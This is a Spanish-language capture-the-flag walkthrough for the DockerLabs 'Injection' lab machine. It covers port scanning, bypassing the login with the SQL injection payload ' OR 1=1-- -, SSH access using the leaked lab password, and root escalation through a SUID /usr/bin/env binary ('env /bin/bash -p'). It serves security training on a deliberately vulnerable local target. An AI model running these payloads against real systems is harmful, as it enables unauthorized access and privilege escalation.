---
icon: flag
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Injection DockerLabs (Very Easy)

### Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip injection.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_deploy.sh injection.tar
```

Info:

```
                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

### Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-02 05:11 EST
Nmap scan report for 172.17.0.2
Host is up (0.000034s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 72:1f:e1:92:70:3f:21:a2:0a:c6:a6:0e:b8:a2:aa:d5 (ECDSA)
|_  256 8f:3a:cd:fc:03:26:ad:49:4a:6c:a1:89:39:f9:7c:22 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Iniciar Sesi\xC3\xB3n
|_http-server-header: Apache/2.4.52 (Ubuntu)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.82 seconds
```

Si entramos en la pagina vemos un `login`, pero si probamos las credenciales por defecto veremos que no nos va a dejar entrar, vamos a probar algun `payload` para ver si fuera vulnerable a un `SQL Injection`:

```
User: ' OR 1=1-- -
Pass: ' OR 1=1-- -
```

Como resultado veremos lo siguiente:

```
Bienvenido Dylan! Has insertado correctamente tu contraseña: KJSDFG789FGSDF78
```

Vemos que directamente podremos `bypassear` el login y ver las credenciales de un usuario, por lo que haremos lo siguiente.

```shell
ssh dylan@<IP>
```

Metemos como contarseña `KJSDFG789FGSDF78` y veremos que estamos dentro.

## Escalate Privileges

Si listamos los permisos `SUID` que tenemos, veremos lo siguiente:

```shell
find / -type f -perm -4000 -ls 2>/dev/null
```

Info:

```
2102291    332 -rwsr-xr-x   1 root     root       338536 Jan  2  2024 /usr/lib/openssh/ssh-keysign
  2102231     36 -rwsr-xr--   1 root     messagebus    35112 Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
  2097641     44 -rwsr-xr-x   1 root     root          44808 Feb  6  2024 /usr/bin/chsh
  2097766     40 -rwsr-xr-x   1 root     root          40496 Feb  6  2024 /usr/bin/newgrp
  2097777     60 -rwsr-xr-x   1 root     root          59976 Feb  6  2024 /usr/bin/passwd
  2097841     56 -rwsr-xr-x   1 root     root          55672 Feb 21  2022 /usr/bin/su
  2097703     72 -rwsr-xr-x   1 root     root          72072 Feb  6  2024 /usr/bin/gpasswd
  2097761     48 -rwsr-xr-x   1 root     root          47480 Feb 21  2022 /usr/bin/mount
  2097867     36 -rwsr-xr-x   1 root     root          35192 Feb 21  2022 /usr/bin/umount
  2097635     72 -rwsr-xr-x   1 root     root          72712 Feb  6  2024 /usr/bin/chfn
  2117300     44 -rwsr-xr-x   1 root     root          43976 Jan  8  2024 /usr/bin/env
```

Vemos la siguiente linea bastante interesante:

```
2117300  44 -rwsr-xr-x   1 root  root   43976 Jan  8  2024 /usr/bin/env
```

Por lo que sabiendo esto podremos ejecutar el siguiente comando:

```shell
env /bin/bash -p
```

Info:

```
bash-5.1# whoami
root
```

Y con esto ya seremos `root`, por lo que habremos terminado la maquina.
